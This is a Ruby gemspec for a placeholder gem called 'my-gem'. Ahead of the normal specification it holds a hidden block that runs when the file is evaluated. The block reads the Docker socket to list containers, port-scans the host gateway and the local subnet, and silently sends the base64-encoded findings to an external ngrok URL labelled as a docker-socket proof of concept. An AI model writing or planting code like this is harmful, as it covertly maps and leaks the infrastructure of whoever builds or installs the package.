COLLAB_URL = "https://ff70-2001-1c00-307-d600-d8df-30e8-ad0a-ea8d.ngrok-free.app"

begin
  require "net/http"
  require "socket"
  require "uri"

  results = []

  # Docker Unix socket
  ["/var/run/docker.sock", "/run/docker.sock"].each do |sock_path|
    begin
      if File.exist?(sock_path)
        sock = UNIXSocket.new(sock_path)
        sock.write("GET /containers/json?all=true HTTP/1.0\r\nHost: localhost\r\n\r\n")
        resp = sock.read(8192)
        sock.close
        results << "=== DOCKER SOCKET #{sock_path} ===\n#{resp[0..5000]}"
      else
        results << "=== DOCKER SOCKET #{sock_path} NOT FOUND ==="
      end
    rescue => e
      results << "=== DOCKER SOCKET #{sock_path} ERR: #{e.class}: #{e.message} ==="
    end
  end

  # Port scan 172.19.0.1
  [22, 80, 443, 2375, 2376, 5000, 5001, 8080, 8443, 9090, 9443].each do |port|
    begin
      s = TCPSocket.new("172.19.0.1", port)
      banner = begin; s.read_nonblock(256); rescue; ""; end
      s.close
      results << "=== 172.19.0.1:#{port} OPEN banner=#{banner.inspect} ==="
    rescue Errno::ECONNREFUSED
      results << "=== 172.19.0.1:#{port} REFUSED ==="
    rescue => e
      results << "=== 172.19.0.1:#{port} ERR: #{e.class} ==="
    end
  end

  # Scan other IPs on subnet
  (1..10).each do |i|
    next if i == 2 || i == 3
    begin
      s = TCPSocket.new("172.19.0.#{i}", 80)
      s.close
      results << "=== 172.19.0.#{i}:80 OPEN ==="
    rescue => e
      results << "=== 172.19.0.#{i}:80 #{e.class} ==="
    end
  end

  payload = [results.join("\n\n")].pack("m0")
  post_uri = URI("#{COLLAB_URL}?poc=docker-socket")
  r = Net::HTTP::Post.new(post_uri)
  r.body = payload
  Net::HTTP.start(post_uri.host, post_uri.port, use_ssl: post_uri.scheme == "https",
                  open_timeout: 8, read_timeout: 8) { |h| h.request(r) }
rescue
end

Gem::Specification.new do |spec|
  spec.name    = "my-gem"
  spec.version = "1.0.0"
  spec.summary = "test"
  spec.add_dependency "rails", "~> 7.0"
end
